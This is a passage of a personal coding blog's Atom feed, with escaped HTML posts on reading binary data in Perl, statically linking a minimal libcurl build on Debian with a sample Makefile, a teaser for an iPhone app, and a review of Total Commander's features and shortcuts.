&lt;span class="nb"&gt;read&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;unpack&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;L&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$buf&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; - &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nb"&gt;read&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;unpack&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;L&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$buf&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; - &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nb"&gt;read&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;unpack&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;C&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$buf&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; - &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nb"&gt;close&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="Coding"></category></entry><entry><title>Using libcurl with minimal dependencies</title><link href="https://jyx.github.io/using-libcurl-with-minimal-dependencies.html" rel="alternate"></link><published>2010-08-05T00:13:15+02:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2010-08-05:/using-libcurl-with-minimal-dependencies.html</id><summary type="html">&lt;p&gt;&lt;img alt="LibCURL logo" src="https://jyx.github.io/images/libcurldep/logo_curl-200x150.jpg" align="right"&gt;
For an ongoing project I needed to retrieve webpages from my C-program and
first I used sockets directly, but then I thought why not try use libcurl? If I
could use libcurl and link it statically then I would get the good features
from libcurl, but still could make my application stand alone.&lt;/p&gt;
&lt;p&gt;With my current setup running Debian (Lenny), I tried to just apt-get the libraries
(&lt;code&gt;libcurl4-openssl-dev&lt;/code&gt;) and build using those libraries That went fine until I
tried to â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="LibCURL logo" src="https://jyx.github.io/images/libcurldep/logo_curl-200x150.jpg" align="right"&gt;
For an ongoing project I needed to retrieve webpages from my C-program and
first I used sockets directly, but then I thought why not try use libcurl? If I
could use libcurl and link it statically then I would get the good features
from libcurl, but still could make my application stand alone.&lt;/p&gt;
&lt;p&gt;With my current setup running Debian (Lenny), I tried to just apt-get the libraries
(&lt;code&gt;libcurl4-openssl-dev&lt;/code&gt;) and build using those libraries That went fine until I
tried to link them statically with my application. After reading different mail
archives, forum and tried on my own I got my application to link (static) with
libcurl. Basically what I needed to do was.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Download libcurl source&lt;/li&gt;
&lt;li&gt;Compile libcurl myself (disable one define, more about that below).&lt;/li&gt;
&lt;li&gt;Point to my own built libcurl.a library when building my own application.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So to save some headache for myself next time I want to do it or for someone
else reading this I've listed the steps I had to do to get this to work.&lt;/p&gt;
&lt;h1&gt;Download libcurl source&lt;/h1&gt;
&lt;p&gt;As of writing this, the latest version of libcurl was 7.21.0 so I downloaded
and unpacked the source.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://curl.haxx.se/download/curl-7.21.0.tar.bz2
tar xjvf curl-7.21.0.tar.bz2
&lt;span class="o"&gt;{&lt;/span&gt;% endcodeblock %&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Compile libcurl&lt;/h1&gt;
&lt;p&gt;Next it was time to run &lt;code&gt;./configure&lt;/code&gt; and &lt;code&gt;make&lt;/code&gt;. Here I basically disabled
everything for libcurl except &lt;code&gt;HTTP&lt;/code&gt; and &lt;code&gt;FILE&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./configure --prefix&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$HOME&lt;/span&gt;/devel/libcurl --disable-dict --disable-ftp --disable-imap --disable-ldap --disable-ldaps --disable-pop3 --disable-proxy --disable-rtsp --disable-shared --disable-smtp --disable-telnet --disable-tftp --disable-zlib --without-ca-bundle --without-gnutls --without-libidn --without-librtmp --without-libssh2 --without-nss --without-ssl --without-zlib
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Edit the file &lt;code&gt;lib/curl_config.h&lt;/code&gt; which is generated during the configure step.
In this file we uncomment the line saying&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/* Define to &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; you have the clock_gettime &lt;span class="k"&gt;function&lt;/span&gt; and monotonic timer. */
//#define HAVE_CLOCK_GETTIME_MONOTONIC &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If I didn't do this, then I would have a dependency to &lt;code&gt;librt&lt;/code&gt; which I didn't want to.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;make
make install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now I was done with libcurl, next I should use this library in my application.&lt;/p&gt;
&lt;h1&gt;Build the application using libcurl&lt;/h1&gt;
&lt;p&gt;To make things simple when describing this I instead use the file
&lt;a href="http://curl.haxx.se/libcurl/c/simple.html"&gt;simple.c&lt;/a&gt;
which is found on &lt;a href="http://curl.haxx.se/libcurl"&gt;libcurl's&lt;/a&gt; site.&lt;/p&gt;
&lt;p&gt;In &lt;a href="/downloads/libcurldep/simple_libcurl.tar.gz"&gt;simple_libcurl.tar.gz&lt;/a&gt; I've
put together the source and a Makefile which builds using the library just
created. The magic is the &lt;code&gt;LDFLAGS&lt;/code&gt; line used in the linking step on line 12
and 24 below. I.e. on line 12 I had have to point the folder where the
library is located that I had built myself (&lt;code&gt;-L/path/to/my/libcurl.a&lt;/code&gt;) and I
still needed to tell the linker that I wanted to use libcurl, hence the
&lt;code&gt;-lcurl&lt;/code&gt; parameter.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;SRCDIR&lt;/span&gt;  &lt;span class="o"&gt;:=&lt;/span&gt; src
&lt;span class="nv"&gt;OBJDIR&lt;/span&gt;  &lt;span class="o"&gt;:=&lt;/span&gt; obj
&lt;span class="nv"&gt;SRC&lt;/span&gt;     &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;patsubst &lt;span class="k"&gt;$(&lt;/span&gt;SRCDIR&lt;span class="k"&gt;)&lt;/span&gt;/%.c, %.c, &lt;span class="k"&gt;$(&lt;/span&gt;wildcard &lt;span class="k"&gt;$(&lt;/span&gt;SRCDIR&lt;span class="k"&gt;)&lt;/span&gt;/*.c&lt;span class="k"&gt;))&lt;/span&gt;
&lt;span class="nv"&gt;OBJS&lt;/span&gt;    &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;addprefix &lt;span class="k"&gt;$(&lt;/span&gt;OBJDIR&lt;span class="k"&gt;)&lt;/span&gt;/, &lt;span class="k"&gt;$(&lt;/span&gt;patsubst %.c, %.o, &lt;span class="k"&gt;$(&lt;/span&gt;SRC&lt;span class="k"&gt;)))&lt;/span&gt;

&lt;span class="nv"&gt;INCDIR&lt;/span&gt;  &lt;span class="o"&gt;:=&lt;/span&gt; inc

&lt;span class="nv"&gt;CC&lt;/span&gt;      &lt;span class="o"&gt;:=&lt;/span&gt; gcc
&lt;span class="nv"&gt;CFLAGS&lt;/span&gt;  &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;addprefix -I, &lt;span class="k"&gt;$(&lt;/span&gt;INCDIR&lt;span class="k"&gt;))&lt;/span&gt;
&lt;span class="nv"&gt;CFLAGS&lt;/span&gt;  &lt;span class="o"&gt;+=&lt;/span&gt; -I/home/jyx/devel/libcurl/include

&lt;span class="nv"&gt;LDFLAGS&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; -L/home/jyx/devel/libcurl/lib -lcurl

&lt;span class="nf"&gt;.PHONY &lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;clean&lt;/span&gt;

&lt;span class="nf"&gt;all&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;

&lt;span class="nf"&gt;$(OBJDIR)/%.o&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nv"&gt;SRCDIR&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;/%.&lt;span class="n"&gt;c&lt;/span&gt;
    @echo &lt;span class="s2"&gt;&amp;quot; (CC)    &lt;/span&gt;$&lt;span class="s2"&gt;&amp;lt;&amp;quot;&lt;/span&gt;
    @&lt;span class="k"&gt;$(&lt;/span&gt;CC&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;CFLAGS&lt;span class="k"&gt;)&lt;/span&gt; -c $&amp;lt; -o &lt;span class="nv"&gt;$@&lt;/span&gt;

&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nv"&gt;OBJS&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
    @echo &lt;span class="s2"&gt;&amp;quot;Create binary: &lt;/span&gt;&lt;span class="nv"&gt;$@&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    @&lt;span class="k"&gt;$(&lt;/span&gt;CC&lt;span class="k"&gt;)&lt;/span&gt; -o main $+ &lt;span class="k"&gt;$(&lt;/span&gt;LDFLAGS&lt;span class="k"&gt;)&lt;/span&gt;

&lt;span class="nf"&gt;clean&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
    rm -f &lt;span class="k"&gt;$(&lt;/span&gt;OBJDIR&lt;span class="k"&gt;)&lt;/span&gt;/* main
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When this is achieved, then you have a quite clean binary when it comes to
dependencies. In the example code in &lt;code&gt;simple_libcurl&lt;/code&gt; I now have these
dependencies on a machine running Debian (Lenny).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ldd main
    linux-vdso.so.1 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt;  &lt;span class="o"&gt;(&lt;/span&gt;0x00007f157db66000&lt;span class="o"&gt;)&lt;/span&gt;
    libc.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/libc.so.6 &lt;span class="o"&gt;(&lt;/span&gt;0x00007f157d5f9000&lt;span class="o"&gt;)&lt;/span&gt;
    /lib64/ld-linux-x86-64.so.2 &lt;span class="o"&gt;(&lt;/span&gt;0x00007f157d94c000&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Have fun with libcurl!&lt;/p&gt;</content><category term="Coding"></category></entry><entry><title>My coming iPhone application</title><link href="https://jyx.github.io/my-coming-iphone-application.html" rel="alternate"></link><published>2010-04-25T00:11:17+02:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2010-04-25:/my-coming-iphone-application.html</id><content type="html">&lt;p&gt;I just want to show an early screenshot of my coming iPhone application that
I'm currently is writing. I do not want to say to much about what purpose it
should fulfill, but it's kind of a maths / algorithm / practice application.
Below is screenshot of how it (most likely) will look.&lt;/p&gt;
&lt;p&gt;&lt;img alt="iPhone" src="https://jyx.github.io/images/iphonebd/bd_preview.jpg" align="left"&gt;&lt;/p&gt;</content><category term="Coding"></category></entry><entry><title>What about Total Commander?</title><link href="https://jyx.github.io/what-about-total-commander.html" rel="alternate"></link><published>2010-03-12T06:26:00+01:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2010-03-12:/what-about-total-commander.html</id><summary type="html">&lt;p&gt;&lt;img alt="Total Commander logo" src="https://jyx.github.io/images/logo_tc.jpg" align="right"&gt;
As my first post on my new site I'll start by talking about Total Commander. I
have been using this wonderful tools since I think I got my first PC. Back then
it was called Windows Commander. So what is it that makes this tool so
wonderful?&lt;/p&gt;
&lt;p&gt;Well, if you just install it and start it you maybe won't be that
impressed. It has a quite old and perhaps boring look. But, if I can choose
between good looking tool â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Total Commander logo" src="https://jyx.github.io/images/logo_tc.jpg" align="right"&gt;
As my first post on my new site I'll start by talking about Total Commander. I
have been using this wonderful tools since I think I got my first PC. Back then
it was called Windows Commander. So what is it that makes this tool so
wonderful?&lt;/p&gt;
&lt;p&gt;Well, if you just install it and start it you maybe won't be that
impressed. It has a quite old and perhaps boring look. But, if I can choose
between good looking tool without any features (Windows Explorer) and a not so
good looking tool with almost any features you can think of that is needed or
could be nice to have when it comes to file handling on a computer. Then I
choose the latter one. Which, in this case is Total Commander.&lt;/p&gt;
&lt;p&gt;So, what do you normally do with your files on your computer? For a normal user
you open files and maybe move files. That might be it for a big part of the
population. But if you are a slightly more advanced user? Then you might need to
duplicate files, pack/unpack files. You maybe want to filter the files so you
only will see files matching a certain pattern. You maybe want to synchronize
your files on a backup drive? Want to syntax hi-light files with certain name?
Copy file names with or without full path to clipboard? All of this and much
more you can do with Total Commander and as a good bonus there are quite easy
keyboard shortcuts for doing that. So you don't have to move one of you hands
between the keyboard and the mouse all the time.&lt;/p&gt;
&lt;h1&gt;The look&lt;/h1&gt;
&lt;p&gt;Total Commander is composed as one main window with a split pane. First time I
saw this was back in time when Amiga 500 was a popular computer. I'm thinking of
the file manager &lt;a href="http://en.wikipedia.org/wiki/Directory_Opus"&gt;Directory Opus&lt;/a&gt;.
Is this a good or a bad thing? Well, since it still exists and seems to be quite
popular among people that have some higher demand on file exploring tool than
the average user have, then I think we can say, yes it's a good thing. To be
honest it's actually very good. You have two panes open all the time within the
same program, so you can very easy move, copy files etc. Since quite some time
ago Total Commander also supports tabs. Hence you can have multiple tabs for
both panes. You jump between the panes by simply pressing TAB and you jump
between tabs in the panes by pressing &lt;code&gt;CTRL + TAB&lt;/code&gt;.&lt;/p&gt;
&lt;h1&gt;Renaming on steroids&lt;/h1&gt;
&lt;p&gt;There's something called Multi-Rename Tool in Total Commander which is quite
handy. It can rename a lot of files for you in very few clicks. Imagine you have
a folder with following files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;    a_foo.zip&lt;/span&gt;
&lt;span class="err"&gt;    b_foo.zip&lt;/span&gt;
&lt;span class="err"&gt;    c_foo.zip&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now you want to rename those to:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;    01_a.zip&lt;/span&gt;
&lt;span class="err"&gt;    02_b.zip&lt;/span&gt;
&lt;span class="err"&gt;    03_c.zip&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In Total Commander you simply mark the files and press &lt;code&gt;CTRL + M&lt;/code&gt; and the
Multi-Rename Tool will launch. In this particular example you prepend the
&lt;code&gt;Rename mask: file name&lt;/code&gt; with &lt;code&gt;01_&lt;/code&gt; and in the &lt;code&gt;Search &amp;amp; Replace&lt;/code&gt; you write
&lt;code&gt;\_foo&lt;/code&gt; in the &lt;code&gt;Search For&lt;/code&gt;, like shown in the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Total Commander multi rename tool" src="https://jyx.github.io/images/tc_multi_rename_tool.png" align="center"&gt;&lt;/p&gt;
&lt;p&gt;You can just imagine how helpful this is when you are renaming a couple of
hundred jpg files snapped with your digital camera where you often have quite
cryptic naming as default.&lt;/p&gt;
&lt;h1&gt;Shortcuts and some more features&lt;/h1&gt;
&lt;p&gt;I could explain a bunch of features like the Multi-Rename Tool in detail. But
some features are very simple to use, so I list a couple of my daily things I do
using Total Commander.&lt;/p&gt;
&lt;p&gt;Let's say you have &lt;code&gt;c:\a&lt;/code&gt; in the left pane and &lt;code&gt;c:\b&lt;/code&gt; in the right pane.&lt;/p&gt;
&lt;p&gt;Mark files? Use &lt;code&gt;space&lt;/code&gt; or &lt;code&gt;SHIFT + PgUp/PgDown&lt;/code&gt; or &lt;code&gt;CTRL + plus&lt;/code&gt; or simply
press plus and make a filter out the files.&lt;/p&gt;
&lt;p&gt;Want to move files from folder &lt;code&gt;a&lt;/code&gt; to &lt;code&gt;b&lt;/code&gt;? Mark the files you want to move and
press &lt;code&gt;F6&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Rename a file? &lt;code&gt;SHIFT + F6&lt;/code&gt;. This is a bit odd, since most other program have
&lt;code&gt;F2&lt;/code&gt; as rename button.&lt;/p&gt;
&lt;p&gt;Pack files? Mark the files, &lt;code&gt;ALT + F5&lt;/code&gt;, then &lt;code&gt;ENTER&lt;/code&gt;. Files are now packed and
put into the folder on the other pane.&lt;/p&gt;
&lt;p&gt;Unpack files? Mark the files, &lt;code&gt;ALT + F9&lt;/code&gt; then &lt;code&gt;ENTER&lt;/code&gt;. Files are unpacked to
the other pane.&lt;/p&gt;
&lt;p&gt;Browse packed files? Simply press &lt;code&gt;ENTER&lt;/code&gt; on a zip file for example and you will
see the content immediately without unpacking it. Very useful! Note that you can
copy single files when in this state. This is also very useful.&lt;/p&gt;
&lt;p&gt;Find files? &lt;code&gt;Alt + F7&lt;/code&gt;, then just search. Note the &lt;code&gt;Search subdirectories&lt;/code&gt; which
is very useful of you have a big project with a lot of subfolder but you know
that the file you are searching is not that deep down into the folder structure.
Then you use this to select how many subdirectories you want to traverse. Very
useful, especially in combination with the &lt;code&gt;Find text&lt;/code&gt; in the same window.&lt;/p&gt;
&lt;p&gt;Go to folders that you have been in? Press &lt;code&gt;ALT + down&lt;/code&gt; and you get a neat list
for the last ~30 folders you have been in. Note that this is unique for the
pane. I.e. one for the left pane and one for the right pane.&lt;/p&gt;
&lt;p&gt;Run a command? Just type it and press &lt;code&gt;ENTER&lt;/code&gt;. For example I want command
prompt. I simply type &lt;code&gt;cmd&lt;/code&gt; then press enter. Voila I get a command prompt
which have the path same to my current folder in my pane.&lt;/p&gt;
&lt;p&gt;Mark a folder as favorite? Press &lt;code&gt;CTRL + d&lt;/code&gt; then &lt;code&gt;a&lt;/code&gt;. Type any name you like to
refer to this folder.&lt;/p&gt;
&lt;p&gt;Go to a favorite folder? Press &lt;code&gt;CTRL + d&lt;/code&gt; and select your favorite folder.&lt;/p&gt;
&lt;p&gt;Do a mouse right click? Press &lt;code&gt;SHIFT + F10&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;View content of a file? Press &lt;code&gt;F3&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Edit a file? Press &lt;code&gt;F4&lt;/code&gt;.&lt;/p&gt;
&lt;h1&gt;Should you buy Total Commander?&lt;/h1&gt;
&lt;p&gt;Well, at least download it asap and start using it. If you just want to try it,
you will only get one(!) nag screen when starting the program. Then you can
leave it running for hours, days, weeks, years with full functionality and no
more nag screens. But, when you notice that you cannot really live without this
tool, then I think you should register the program. Christian Ghisler (the
author) deserves money for this great tool and he has given free updates since I
registered it, which was quite long time ago. As the headline says, I think
Microsoft should buy this tool/company and replace Windows Explorer with Total
Commander. Thanks!&lt;/p&gt;
&lt;p&gt;Link to the official site: http://www.ghisler.com&lt;/p&gt;</content><category term="Tools"></category></entry></feed>